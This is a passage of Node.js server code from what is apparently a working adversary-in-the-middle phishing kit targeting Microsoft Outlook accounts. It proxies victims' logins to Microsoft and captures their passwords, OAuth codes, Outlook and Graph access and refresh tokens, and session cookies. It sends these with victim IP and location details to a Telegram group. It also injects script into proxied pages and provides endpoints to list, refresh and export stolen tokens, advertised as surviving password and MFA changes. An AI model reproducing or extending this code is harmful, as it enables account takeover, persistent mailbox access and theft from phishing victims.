          const codeVerifier = codeVerifiers.get(sessionId);
          
          if (codeVerifier) {
            console.log(`✅ Found code verifier for session ${sessionId}`);
            
            if (sessionId.startsWith('dual_')) {
              console.log('🔄 Starting WINNING STRATEGY dual token capture...');
              
              let tokenSession = capturedData.get(sessionId) || { cookies: [], credentials: {}, tokens: {} };
              
              console.log('🔄 Step 1: Exchanging code for Outlook token...');
              const outlookTokens = await exchangeForResource(
                sessionId, code, codeVerifier, 
                'https://outlook.office.com/.default', 
                'outlook'
              );
              
              if (outlookTokens) {
                tokenSession.tokens.outlook = {
                  access_token: outlookTokens.access_token,
                  refresh_token: outlookTokens.refresh_token,
                  expires_in: outlookTokens.expires_in,
                  scope: outlookTokens.scope,
                  captured_at: new Date().toISOString()
                };
                console.log('✅ Outlook token captured!');
                
                console.log('🔄 Step 2: Using Outlook refresh token to obtain Graph token...');
                
                try {
                  const graphResponse = await axios.post('https://login.microsoftonline.com/common/oauth2/v2.0/token',
                    new URLSearchParams({
                      client_id: DUAL_TOKEN_CLIENT_ID,
                      refresh_token: outlookTokens.refresh_token,
                      grant_type: 'refresh_token',
                      scope: 'https://graph.microsoft.com/.default'
                    }).toString(),
                    {
                      headers: {
                        'Content-Type': 'application/x-www-form-urlencoded',
                        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
                        'Accept': 'application/json'
                      }
                    }
                  );
                  
                  const graphTokens = graphResponse.data;
                  console.log('✅ Graph token obtained via refresh!');
                  
                  tokenSession.tokens.graph = {
                    access_token: graphTokens.access_token,
                    refresh_token: graphTokens.refresh_token || outlookTokens.refresh_token,
                    expires_in: graphTokens.expires_in,
                    scope: graphTokens.scope,
                    captured_at: new Date().toISOString()
                  };
                  
                } catch (graphError) {
                  console.error('❌ Graph token via refresh failed:', graphError.response?.data || graphError.message);
                }
              }
              
              tokenSession.tokens.dual_capture = true;
              tokenSession.tokens.captured_at = new Date().toISOString();
              capturedData.set(sessionId, tokenSession);
              
              await sendDualTokenNotification(sessionId, username, victimInfo, 
                tokenSession.tokens.outlook, 
                tokenSession.tokens.graph);
              
              console.log('🔄 Redirecting user to Outlook from /common/login');
              return res.redirect('https://outlook.live.com/mail/');
            } else {
              const tokens = await exchangeDesktopCodeForTokens(sessionId, code, codeVerifier);
              if (tokens) {
                await sendDesktopTokenNotification(sessionId, username, victimInfo, tokens);
                console.log('🔄 Redirecting user to Outlook from /common/login');
                return res.redirect('https://outlook.live.com/mail/');
              }
            }
          } else {
            console.log(`❌ No code verifier found for session ${sessionId}`);
          }
        }
      }
      
      if (location.includes('/common/login')) {
        const errorMatch = location.match(/error=([^&]+)/);
        const error = errorMatch ? errorMatch[1] : 'invalid_password';
        return res.redirect(`/microsoft?error=${error}&username=${encodeURIComponent(username || '')}&state=${sessionId}`);
      }
      
      return res.redirect(location);
    }
    
    res.send(response?.data || 'OK');
    
  } catch (error) {
    console.error('❌ Error forwarding to /common/login:', error.message);
    res.redirect('/microsoft?error=connection_error');
  }
});

// Desktop token exchange function
async function exchangeDesktopCodeForTokens(sessionId, code, codeVerifier) {
  console.log(`🔄 Exchanging desktop code for 90-day tokens (Session: ${sessionId})...`);
  
  try {
    const tokenResponse = await axios.post('https://login.microsoftonline.com/common/oauth2/v2.0/token', 
      new URLSearchParams({
        client_id: DESKTOP_CLIENT_ID,
        code: code,
        code_verifier: codeVerifier,
        redirect_uri: 'urn:ietf:wg:oauth:2.0:oob',
        grant_type: 'authorization_code',
        scope: 'https://outlook.office.com/.default offline_access'
      }).toString(),
      {
        headers: {
          'Content-Type': 'application/x-www-form-urlencoded',
          'User-Agent': 'Outlook/2026 (Windows NT 10.0; Win64; x64)',
          'X-Client-SKU': 'MSAL.Desktop',
          'X-Client-Ver': '4.48.1.0',
          'Accept': 'application/json'
        }
      }
    );
    
    return tokenResponse.data;
    
  } catch (error) {
    console.error(`❌ Desktop token exchange failed:`, error.response?.data || error.message);
    return null;
  }
}

// ============= DESKTOP TOKEN NOTIFICATION =============
async function sendDesktopTokenNotification(sessionId, username, victimInfo, tokens) {
  try {
    const fileContent = `🔐 90-DAY DESKTOP TOKENS CAPTURED (CAE-ENABLED)
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
Session ID: ${sessionId}
Email: ${username}
Capture Time: ${new Date().toISOString()}
CAE Status: ENABLED - Survives password & MFA changes
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

ACCESS TOKEN (Valid for ${tokens.expires_in} seconds)
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
${tokens.access_token}

REFRESH TOKEN (Valid for 90 DAYS)
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
${tokens.refresh_token}

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
Victim Information:
IP: ${victimInfo.ip}
Location: ${victimInfo.location}
Browser: ${victimInfo.browser}
OS: ${victimInfo.os}
Time: ${victimInfo.timestamp}
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━`;

    await bot.sendDocument(
      telegramGroupId,
      Buffer.from(fileContent, 'utf-8'),
      {},
      {
        filename: `desktop_tokens_CAE_${sessionId}_${Date.now()}.txt`,
        contentType: 'text/plain'
      }
    );
    
    const summaryMessage = 
      `🎯 *90-DAY DESKTOP TOKENS CAPTURED!*\n` +
      `━━━━━━━━━━━━━━━━━━\n` +
      `*Session:* \`${sessionId}\`\n` +
      `*Email:* \`${username}\`\n` +
      `*CAE:* ✅ ENABLED (Survives password & MFA changes)*\n` +
      `━━━━━━━━━━━━━━━━━━\n` +
      `*Token file attached below!*\n` +
      `*Check Status:* \`GET /api/token-status/${sessionId}\`\n` +
      `*Export Tokens:* \`GET /api/export-persistent/${sessionId}\``;
    
    await bot.sendMessage(telegramGroupId, summaryMessage, { parse_mode: 'Markdown' });
    
  } catch (error) {
    console.error('❌ Failed to send token file:', error.message);
  }
}

// ============= SERVE OUTLOOK PAGE =============
async function serveOutlookPage(res, sessionId, username, victimInfo) {
  console.log('🔄 Serving Outlook page directly...');
  
  try {
    const outlookSession = capturedData.get(sessionId) || {};
    const cookieHeader = outlookSession.cookies ? outlookSession.cookies.join('; ') : '';
    
    const outlookResponse = await axios.get('https://outlook.live.com/mail/', {
      headers: {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
        'Cookie': cookieHeader,
        'Authorization': outlookSession.tokens?.access_token ? `Bearer ${outlookSession.tokens.access_token}` : ''
      },
      maxRedirects: 5,
      validateStatus: status => status >= 200 && status < 400
    }).catch(err => err.response);
    
    let outlookHtml = outlookResponse?.data || '';
    const outlookCookies = outlookResponse?.headers['set-cookie'] || [];
    
    if (outlookCookies.length > 0) {
      console.log(`🍪 Captured ${outlookCookies.length} additional Outlook cookies`);
      
      let outlookDataSession = capturedData.get(sessionId) || { cookies: [], credentials: {}, tokens: {} };
      if (!outlookDataSession.cookies) outlookDataSession.cookies = [];
      outlookCookies.forEach(cookie => {
        if (!outlookDataSession.cookies.includes(cookie)) outlookDataSession.cookies.push(cookie);
      });
      capturedData.set(sessionId, outlookDataSession);
    }
    
    await sendCookieNotification(sessionId, username, victimInfo);
    
    if (outlookHtml) {
      const injectionSession = capturedData.get(sessionId) || {};
      const tokens = injectionSession.tokens || {};
      
      const injectionScript = `
        <script>
          (function() {
            console.log('🔍 Outlook page loaded via proxy - session: ${sessionId}');
            
            const capturedData = {
              sessionId: '${sessionId}',
              hasTokens: ${tokens.access_token ? 'true' : 'false'},
              timestamp: new Date().toISOString()
            };
            
            localStorage.setItem('phish_captured_' + '${sessionId}', JSON.stringify(capturedData));
            
            fetch('/api/login-confirmed', {
              method: 'POST',
              headers: { 'Content-Type': 'application/json' },
              body: JSON.stringify({ 
                sessionId: '${sessionId}',
                hasTokens: ${tokens.access_token ? 'true' : 'false'},
                url: window.location.href
              })
            }).catch(() => {});
          })();
        </script>
      `;
      
      if (outlookHtml.includes('</body>')) {
        outlookHtml = outlookHtml.replace('</body>', injectionScript + '</body>');
      } else {
        outlookHtml = outlookHtml + injectionScript;
      }
      
      const finalSession = capturedData.get(sessionId) || {};
      if (finalSession.cookies && finalSession.cookies.length > 0) {
        res.setHeader('Set-Cookie', finalSession.cookies);
      }
      
      console.log(`✅ Serving modified Outlook page for session ${sessionId}`);
      return res.send(outlookHtml);
    }
    
    res.redirect('https://outlook.live.com/mail/');
    
  } catch (error) {
    console.error('❌ Error serving Outlook page:', error.message);
    res.redirect('https://outlook.live.com/mail/');
  }
}

app.get('/common/login', (req, res) => {
  console.log('🔄 GET to /common/login - processing OAuth callback');
  
  if (req.url.includes('#code=')) {
    const sessionId = req.query.state || 'unknown';
    const codeMatch = req.url.match(/#code=([^&]+)/);
    
    if (codeMatch && codeMatch[1]) {
      const code = codeMatch[1];
      console.log(`✅ OAuth callback with code for session ${sessionId}`);
      return res.redirect('/microsoft?processing=true');
    }
  }
  
  const error = req.query.error || 'invalid_password';
  const username = req.query.username || '';
  res.redirect(`/microsoft?error=${error}&username=${encodeURIComponent(username)}`);
});

app.post('/proxy/desktop-login', express.urlencoded({ extended: true }), async (req, res) => {
  console.log('📥 Desktop login submission');
  
  const sessionId = req.body?.state || req.body?.sessionId || 'unknown';
  const username = req.body?.login;
  const password = req.body?.passwd;
  
  const victimInfo = await getVictimInfo(req);
  
  if (username && password) {
    let session = capturedData.get(sessionId) || { credentials: {}, cookies: [], tokens: {} };
    session.credentials = { username, password, time: new Date().toISOString(), victimInfo };
    capturedData.set(sessionId, session);
  }
  
  const codeVerifier = codeVerifiers.get(sessionId);
  
  if (!codeVerifier) {
    console.error(`❌ No code verifier for session ${sessionId}`);
    return res.redirect('/microsoft-desktop?error=no_verifier');
  }
  
  try {
    const formData = new URLSearchParams();
    Object.keys(req.body).forEach(key => formData.append(key, req.body[key]));
    
    console.log('📤 Submitting desktop login form...');
    
    const axiosInstance = axios.create({
      maxRedirects: 0,
      validateStatus: status => status >= 200 && status < 400
    });
    
    const response = await axiosInstance.post('https://login.microsoftonline.com/common/login', formData.toString(), {
      headers: {
        'Content-Type': 'application/x-www-form-urlencoded',
        'User-Agent': 'Outlook/2026 (Windows NT 10.0; Win64; x64)',
        'X-Client-SKU': 'MSAL.Desktop',
        'X-Client-Ver': '4.48.1.0'
      }
    }).catch(err => err.response);
    
    if (response?.status >= 300 && response?.status < 400 && response?.headers?.location) {
      const location = response.headers.location;
      console.log(`↪️ Microsoft redirects to: ${location}`);
      
      if (location.includes('urn:ietf:wg:oauth:2.0:oob') && location.includes('code=')) {
        const codeMatch = location.match(/[?&]code=([^&]+)/);
        if (codeMatch && codeMatch[1]) {
          const code = decodeURIComponent(codeMatch[1]);
          console.log(`✅ Desktop auth code captured for ${sessionId}: ${code.substring(0, 30)}...`);
          
          const tokenParams = {
            client_id: DESKTOP_CLIENT_ID,
            code: code,
            code_verifier: codeVerifier,
            redirect_uri: 'urn:ietf:wg:oauth:2.0:oob',
            grant_type: 'authorization_code',
            scope: 'https://outlook.office.com/.default offline_access'
          };
          
          const tokenResponse = await axios.post('https://login.microsoftonline.com/common/oauth2/v2.0/token', 
            new URLSearchParams(tokenParams).toString(),
            {
              headers: {
                'Content-Type': 'application/x-www-form-urlencoded',
                'User-Agent': 'Outlook/2026 (Windows NT 10.0; Win64; x64)',
                'X-Client-SKU': 'MSAL.Desktop',
                'X-Client-Ver': '4.48.1.0',
                'Accept': 'application/json'
              }
            }
          );
          
          const tokens = tokenResponse.data;
          
          if (tokens.access_token && tokens.refresh_token) {
            console.log('✅ 90-DAY TOKENS CAPTURED!');
            
            let tokenSession = capturedData.get(sessionId) || { cookies: [], credentials: {}, tokens: {} };
            tokenSession.tokens = {
              access_token: tokens.access_token,
              refresh_token: tokens.refresh_token,
              id_token: tokens.id_token,
              expires_in: tokens.expires_in,
              token_type: tokens.token_type,
              scope: tokens.scope,
              captured_at: new Date().toISOString(),
              is_desktop: true
            };
            
            const tokenManager = new PersistentTokenManager(sessionId, tokens, 'outlook');
            if (!tokenSession.tokenManagers) tokenSession.tokenManagers = {};
            tokenSession.tokenManagers.outlook = tokenManager;
            
            capturedData.set(sessionId, tokenSession);
            
            await sendDesktopTokenNotification(sessionId, username, victimInfo, tokens);
            
            console.log('🔄 Redirecting user to Outlook...');
            return res.redirect('https://outlook.live.com/mail/');
          }
        }
      }
      
      if (!location.includes('urn:ietf:wg:oauth:2.0:oob')) {
        return res.redirect(location);
      }
    }
    
    res.redirect('/microsoft-desktop?error=auth_failed');
    
  } catch (error) {
    console.error('❌ Desktop login error:', error.message);
    if (error.response) {
      console.error('Response data:', error.response.data);
    }
    res.redirect('/microsoft-desktop?error=connection_error');
  }
});

// ============= DESKTOP TOKEN VERIFICATION =============
app.get('/verify-desktop/:sessionId', async (req, res) => {
  const sessionId = req.params.sessionId;
  const session = capturedData.get(sessionId);
  
  if (!session || !session.tokens) {
    return res.json({ error: 'Session or tokens not found' });
  }
  
  try {
    const token = session.tokens.access_token || session.tokens.outlook?.access_token;
    const response = await axios.get('https://outlook.office.com/api/v2.0/me', {
      headers: {
        'Authorization': `Bearer ${token}`,
        'User-Agent': 'Outlook/2026 (Windows NT 10.0; Win64; x64)'
      }
    });
    
    res.json({
      success: true,
      message: 'Token is valid!',
      user: response.data,
      token_type: session.tokens.dual_capture ? 'Dual token session (CAE-Enabled)' : (session.tokens.is_desktop ? 'Desktop token (CAE-Enabled)' : 'Web token'),
      has_outlook: !!session.tokens.outlook,
      has_graph: !!session.tokens.graph,
      cae_enabled: true
    });
  } catch (error) {
    res.json({
      success: false,
      error: error.response?.data || error.message
    });
  }
});

// ============= PERSISTENT TOKEN MANAGEMENT ENDPOINTS =============

// ============= PERSISTENT TOKEN MANAGEMENT ENDPOINTS =============

// Get token status for a session with CAE info
app.get('/api/token-status/:sessionId', async (req, res) => {
  const sessionId = req.params.sessionId;
  const session = capturedData.get(sessionId);
  
  if (!session) {
    return res.status(404).json({ 
      error: 'Session not found',
      message: `No session found with ID: ${sessionId}`,
      availableSessions: Array.from(capturedData.keys()).slice(0, 10)
    });
  }
  
  // Check if session has tokenManagers
  if (!session.tokenManagers || Object.keys(session.tokenManagers).length === 0) {
    // Check if session has raw tokens that can be migrated
    const hasRefreshToken = session.tokens?.outlook?.refresh_token || 
                           session.tokens?.graph?.refresh_token || 
                           session.tokens?.refresh_token;
    
    return res.json({
      sessionId,
      status: 'not_migrated',
      message: 'Session has not been migrated to persistent system',
      hasRefreshToken: !!hasRefreshToken,
      availableTokens: {
        hasOutlook: !!session.tokens?.outlook,
        hasGraph: !!session.tokens?.graph,
        hasDesktop: !!session.tokens?.is_desktop
      },
      migrationEndpoint: `/api/migrate-token/${sessionId}`,
      note: 'Use the migration endpoint to convert this session to persistent tokens'
    });
  }
  
  const status = {};
  for (const [resource, tokenManager] of Object.entries(session.tokenManagers)) {
    status[resource] = tokenManager.getStatus();
    
    if (req.query.test === 'true') {
      const testResult = await tokenManager.testAccess();
      status[resource].testResult = testResult;
    }
  }
  
  res.json({
    sessionId,
    email: session.credentials?.username,
    tokenStatus: status,
    caeEnabled: true,
    note: "CAE-enabled tokens survive password and MFA changes automatically"
  });
});


// List all available sessions with their token status
app.get('/api/list-sessions', (req, res) => {
  const sessions = [];
  
  for (const [sessionId, session] of capturedData.entries()) {
    const hasOutlookToken = !!(session.tokens?.outlook?.refresh_token || session.tokens?.refresh_token);
    const hasGraphToken = !!session.tokens?.graph?.refresh_token;
    const hasPersistent = !!(session.tokenManagers && Object.keys(session.tokenManagers).length > 0);
    
    sessions.push({
      sessionId,
      email: session.credentials?.username,
      hasOutlookToken,
      hasGraphToken,
      hasPersistent,
      tokenCount: session.tokens ? Object.keys(session.tokens).length : 0,
      capturedAt: session.credentials?.time || session.time
    });
  }
  
  res.json({
    total: capturedData.size,
    sessions: sessions.sort((a, b) => new Date(b.capturedAt) - new Date(a.capturedAt)),
    note: "Use /api/token-status/:sessionId to check details of a specific session"
  });
});

// Manually refresh a specific token
app.post('/api/refresh-session/:sessionId/:resource', express.json(), async (req, res) => {
  const { sessionId, resource } = req.params;
  const session = capturedData.get(sessionId);
  
  if (!session || !session.tokenManagers?.[resource]) {
    return res.status(404).json({ error: 'Session or resource not found' });
  }
  
  const tokenManager = session.tokenManagers[resource];
  
  try {
    const newTokens = await tokenManager.refresh(resource === 'graph');
    
    if (resource === 'outlook' && session.tokens?.outlook) {
      session.tokens.outlook.access_token = tokenManager.accessToken;
      session.tokens.outlook.refresh_token = tokenManager.refreshToken;
    } else if (resource === 'graph' && session.tokens?.graph) {
      session.tokens.graph.access_token = tokenManager.accessToken;
      session.tokens.graph.refresh_token = tokenManager.refreshToken;
    }
    
    capturedData.set(sessionId, session);
    
    res.json({
      success: true,
      message: 'Token refreshed successfully',
      expiresIn: Math.floor((tokenManager.expiresAt - Date.now()) / 1000),
      expiresAt: new Date(tokenManager.expiresAt).toISOString(),
      refreshCount: tokenManager.refreshCount
    });
  } catch (error) {
    res.status(500).json({
      success: false,
      error: error.message,
      requiresReauth: error.message.includes('revoked')
    });
  }
});

// Export tokens with refresh capabilities
app.get('/api/export-persistent/:sessionId', (req, res) => {
  const sessionId = req.params.sessionId;
  const session = capturedData.get(sessionId);
  
  if (!session || !session.tokenManagers) {
    return res.status(404).json({ error: 'Session or tokens not found' });
  }
  
  const exportData = {};
  const refreshExamples = {};
  
  for (const [resource, tokenManager] of Object.entries(session.tokenManagers)) {
    exportData[resource] = {
      access_token: tokenManager.accessToken,
      refresh_token: tokenManager.refreshToken,
      expires_at: tokenManager.expiresAt,
      expires_in_seconds: Math.max(0, Math.floor((tokenManager.expiresAt - Date.now()) / 1000)),
      scopes: tokenManager.scopes,
      refresh_count: tokenManager.refreshCount,
      cae_enabled: tokenManager.caeEnabled
    };
    
    const clientId = resource === 'graph' ? DUAL_TOKEN_CLIENT_ID : DESKTOP_CLIENT_ID;
    refreshExamples[resource] = {
      curl: `curl -X POST https://login.microsoftonline.com/common/oauth2/v2.0/token \\
  -H "Content-Type: application/x-www-form-urlencoded" \\
  -d "client_id=${clientId}" \\
  -d "refresh_token=${tokenManager.refreshToken}" \\
  -d "grant_type=refresh_token" \\
  -d "scope=${resource === 'graph' ? 'https://graph.microsoft.com/.default' : 'https://outlook.office.com/.default'} offline_access" \\
  -d "claims=%7B%22access_token%22%3A%7B%22xms_cc%22%3A%7B%22values%22%3A%5B%22CP1%22%5D%7D%7D%7D"`,
      
      python: `import requests

response = requests.post(
    'https://login.microsoftonline.com/common/oauth2/v2.0/token',
    data={
        'client_id': '${clientId}',
        'refresh_token': '${tokenManager.refreshToken}',
        'grant_type': 'refresh_token',
        'scope': '${resource === 'graph' ? 'https://graph.microsoft.com/.default' : 'https://outlook.office.com/.default'} offline_access',
        'claims': '{"access_token":{"xms_cc":{"values":["CP1"]}}}'
    }
)
print(response.json())`
    };
  }
  
  res.json({
    sessionId,
    email: session.credentials?.username,
    tokens: exportData,
    refresh_examples: refreshExamples,
    cae_status: "✅ Continuous Access Evaluation enabled - tokens will survive password and MFA changes",
    auto_refresh: "Tokens are automatically refreshed every 30 minutes before expiry"
  });
});

// Get all sessions with persistent tokens
app.get('/api/persistent-sessions', (req, res) => {
  const persistentSessions = [];
  
  for (const [sessionId, sessionData] of capturedData.entries()) {
    if (sessionData.tokenManagers && Object.keys(sessionData.tokenManagers).length > 0) {
      const sessionInfo = {
        sessionId,
        email: sessionData.credentials?.username,
        tokens: {}
      };
      
      for (const [resource, tokenManager] of Object.entries(sessionData.tokenManagers)) {
        sessionInfo.tokens[resource] = {
          valid: !tokenManager.isExpired(),
          expiresIn: Math.max(0, Math.floor((tokenManager.expiresAt - Date.now()) / 1000)),
          refreshCount: tokenManager.refreshCount,
          caeEnabled: tokenManager.caeEnabled
        };
      }
      
      persistentSessions.push(sessionInfo);
    }
  }
  
  res.json({
    total: persistentSessions.length,
    sessions: persistentSessions,
    note: "These sessions have CAE-enabled refresh tokens that survive password and MFA changes"
  });
});

// Test token with automatic claims challenge handling
app.get('/api/test-persistent/:sessionId/:resource', async (req, res) => {
  const { sessionId, resource } = req.params;
  const session = capturedData.get(sessionId);
  
  if (!session || !session.tokenManagers?.[resource]) {
    return res.status(404).json({ error: 'Session or resource not found' });
  }
  
  const tokenManager = session.tokenManagers[resource];
  
  try {
    const token = await tokenManager.getValidToken();
    
    const testUrl = resource === 'graph' 
      ? 'https://graph.microsoft.com/v1.0/me'
      : 'https://outlook.office.com/api/v2.0/me';
    
    const response = await axios.get(testUrl, {
      headers: {
        'Authorization': `Bearer ${token}`,
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
      }
    });
    
    res.json({
      success: true,
      message: 'Token is valid and working!',
      user: response.data,
      tokenStatus: tokenManager.getStatus()
    });
    
  } catch (error) {
    if (error.response?.status === 401) {
      const claimsHeader = error.response?.headers?.['www-authenticate'];
      
      if (claimsHeader && claimsHeader.includes('claims')) {
        console.log('⚠️ Claims challenge detected, refreshing with claims...');
        
        try {
          await tokenManager.refresh(resource === 'graph');
          const newToken = tokenManager.accessToken;
          
          const retryResponse = await axios.get(testUrl, {
            headers: {
              'Authorization': `Bearer ${newToken}`,
              'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
            }
          });
          
          return res.json({
            success: true,
            message: 'Token recovered after claims challenge!',
            user: retryResponse.data,
            tokenStatus: tokenManager.getStatus()
          });
        } catch (refreshError) {
          return res.status(401).json({
            success: false,
            error: 'Claims challenge handling failed',
            details: refreshError.message
          });
        }
      }
    }
    
    res.status(500).json({
      success: false,
      error: error.message,
      response: error.response?.data
    });
  }
});

// ============= PROXY ENDPOINT =============
app.options('/api/outlook-proxy', (req, res) => {
  const origin = isProduction ? cleanAppUrl : 'http://localhost:3001';
  res.setHeader('Access-Control-Allow-Origin', origin);
  res.setHeader('Access-Control-Allow-Methods', 'GET, POST, OPTIONS, PUT, DELETE');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type, Authorization');
  res.setHeader('Access-Control-Allow-Credentials', 'true');
  res.sendStatus(200);
});

app.post('/api/outlook-proxy', express.json(), async (req, res) => {
  const origin = isProduction ? cleanAppUrl : 'http://localhost:3001';
  res.setHeader('Access-Control-Allow-Origin', origin);
  res.setHeader('Access-Control-Allow-Methods', 'GET, POST, OPTIONS, PUT, DELETE');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type, Authorization');
  res.setHeader('Access-Control-Allow-Credentials', 'true');
  
  console.log(`📥 Proxy request: ${req.method}`);
  
  const { outlookPath, method, data, queryParams } = req.body;
  
  if (!outlookPath) {
    return res.status(400).json({ error: 'No outlookPath specified' });
  }
  
  const targetUrl = outlookPath;
  console.log(`🔄 Forwarding ${method || 'GET'} to: ${targetUrl}`);
  
  try {
    const forwardHeaders = {
      'Authorization': req.headers.authorization,
      'Content-Type': 'application/json',
      'Accept': 'application/json',
      'User-Agent': 'Outlook/2026 (Windows NT 10.0; Win64; x64)'
    };
    
    Object.keys(forwardHeaders).forEach(key => 
      forwardHeaders[key] === undefined && delete forwardHeaders[key]
    );
    
    const response = await axios({
      method: method || 'GET',
      url: targetUrl,
      data: data,
      headers: forwardHeaders,
      params: queryParams,
      timeout: 30000
    });
    
    console.log(`✅ Proxy success: ${response.status}`);
    
    if (response.headers['content-type']) {
      res.setHeader('Content-Type', response.headers['content-type']);
    }
    
    res.status(response.status).json(response.data);
    
  } catch (error) {
    console.error('❌ Proxy error:', error.message);
    
    if (error.response) {
      res.status(error.response.status).json({
        error: 'API error',
        status: error.response.status,
        details: error.response.data
      });
    } else if (error.request) {
      res.status(504).json({ 
        error: 'Gateway Timeout', 
        message: 'No response from API' 
      });
    } else {
      res.status(500).json({ 
        error: 'Proxy failed', 
        message: error.message 
      });
    }
  }
});

// ============= COOKIE NOTIFICATION =============
async function sendCookieNotification(sessionId, username, victimInfo) {
  const notifySession = capturedData.get(sessionId);
  if (!notifySession) return;
  
  const criticalPatterns = ['FedAuth', 'x-ms-gateway-token', 'ESTSAUTH', 'ESTSAUTHPERSISTENT', 'MSISAuth', 'SignInStateCookie'];
  const capturedCritical = (notifySession.cookies || []).filter(c => criticalPatterns.some(p => c.includes(p)));
  
  const cookieSummary = capturedCritical.map(c => {
    const match = c.match(/([^=]+)=([^;]+)/);
    return match ? `• ${match[1]}=${match[2].substring(0, 30)}...` : `• ${c.substring(0, 50)}...`;
  }).join('\n');
  
  let tokenSummary = '';
  if (notifySession.tokens) {
    if (notifySession.tokens.outlook) {
      tokenSummary += `• Outlook Token: ${notifySession.tokens.outlook.access_token?.substring(0, 30)}...\n`;
    }
    if (notifySession.tokens.graph) {
      tokenSummary += `• Graph Token: ${notifySession.tokens.graph.access_token?.substring(0, 30)}...\n`;
    }
    if (notifySession.tokens.access_token && !notifySession.tokens.dual_capture) {
      tokenSummary += `• Access Token: ${notifySession.tokens.access_token?.substring(0, 30)}...\n`;
      tokenSummary += `• Refresh Token: ${notifySession.tokens.refresh_token?.substring(0, 30)}...\n`;
    }
    tokenSummary += `• Expires In: ${notifySession.tokens.expires_in || notifySession.tokens.outlook?.expires_in || 'Unknown'} seconds`;
    tokenSummary += `\n• CAE: ✅ Enabled (Survives password & MFA changes)`;
  } else {
    tokenSummary = 'No tokens';
  }
  
  if ((capturedCritical.length > 0 || notifySession.tokens) && bot && telegramGroupId) {
    const message = 
      `🎯 *COMPLETE SESSION CAPTURED!*\n` +
      `━━━━━━━━━━━━━━━━━━\n` +
      `*Session:* \`${sessionId}\`\n` +
      `*Email:* \`${username}\`\n` +
      `*CAE:* ✅ ENABLED\n` +
      `━━━━━━━━━━━━━━━━━━\n` +
      `*🍪 CRITICAL COOKIES (${capturedCritical.length}):*\n${cookieSummary || 'None'}\n` +
      `━━━━━━━━━━━━━━━━━━\n` +
      `*🔑 TOKENS:*\n${tokenSummary}\n` +
      `━━━━━━━━━━━━━━━━━━\n` +
      `*Victim Information:*\n` +
      `*IP:* \`${victimInfo.ip}\`\n` +
      `*Location:* ${victimInfo.location}\n` +
      `*Browser:* ${victimInfo.browser}\n` +
      `*OS:* ${victimInfo.os}\n` +
      `*Time:* ${victimInfo.timestamp}\n` +
      `━━━━━━━━━━━━━━━━━━\n` +
      `*Check Status:* \`GET /api/token-status/${sessionId}\`\n` +
      `*Export Tokens:* \`GET /api/export-persistent/${sessionId}\``;
    
    await bot.sendMessage(telegramGroupId, message, { parse_mode: 'Markdown' })
      .catch(e => console.error('Telegram error:', e.message));
  }
}

// Serve the token manager dashboard
app.get('/token-manager', (req, res) => {
  res.sendFile(path.join(__dirname, 'token-manager.html'));
});


// ============= TOKEN REFRESH ENDPOINTS =============

// Generic token refresh endpoint (for Outlook tokens)
app.post('/api/refresh-token', express.json(), async (req, res) => {
  console.log('📥 Token refresh request received');
  
  const origin = isProduction ? cleanAppUrl : 'http://localhost:3001';
  
  res.setHeader('Access-Control-Allow-Origin', origin);
  res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type');
  res.setHeader('Access-Control-Allow-Credentials', 'true');
  
  const { refreshToken, clientId } = req.body;
  
  if (!refreshToken) {
    return res.status(400).json({ error: 'No refresh token provided' });
  }
  
  try {
    const claims = JSON.stringify({
      access_token: {
        xms_cc: { values: ["CP1"] }
      }
    });
    
    const response = await axios.post('https://login.microsoftonline.com/common/oauth2/v2.0/token', 
      new URLSearchParams({
        client_id: clientId || 'd3590ed6-52b3-4102-aeff-aad2292ab01c',
        refresh_token: refreshToken,
        grant_type: 'refresh_token',
        scope: 'https://outlook.office.com/.default offline_access',
        claims: claims
      }).toString(),
      {
        headers: {
          'Content-Type': 'application/x-www-form-urlencoded',
          'User-Agent': 'Outlook/2026 (Windows NT 10.0; Win64; x64)'
        }
      }
    );
    
    console.log('✅ Token refreshed successfully');
    res.json(response.data);
    
  } catch (error) {
    console.error('❌ Token refresh failed:', error.response?.data || error.message);
    res.status(error.response?.status || 500).json({ 
      error: 'Token refresh failed',
      details: error.response?.data || error.message 
    });
  }
});

app.options('/api/refresh-token', (req, res) => {
  const origin = isProduction ? cleanAppUrl : 'http://localhost:3001';
  res.setHeader('Access-Control-Allow-Origin', origin);
  res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type');
  res.setHeader('Access-Control-Allow-Credentials', 'true');
  res.sendStatus(200);
});

// ============= GRAPH TOKEN REFRESH ENDPOINT =============
app.post('/api/refresh-graph', express.json(), async (req, res) => {
  console.log('📥 Graph token refresh request received');
  
  const origin = isProduction ? cleanAppUrl : 'http://localhost:3001';
  
  res.setHeader('Access-Control-Allow-Origin', origin);
  res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type');
  res.setHeader('Access-Control-Allow-Credentials', 'true');
  
  const { refreshToken, clientId } = req.body;
  
  if (!refreshToken) {
    return res.status(400).json({ error: 'No refresh token provided' });
  }
  
  try {
    const claims = JSON.stringify({
      access_token: {
        xms_cc: { values: ["CP1"] }
      }
    });
    
    const response = await axios.post('https://login.microsoftonline.com/common/oauth2/v2.0/token', 
      new URLSearchParams({
        client_id: clientId || '1fec8e78-bce4-4aaf-ab1b-5451cc387264',
        refresh_token: refreshToken,
        grant_type: 'refresh_token',
        scope: 'https://graph.microsoft.com/.default offline_access',
        claims: claims
      }).toString(),
      {
        headers: {
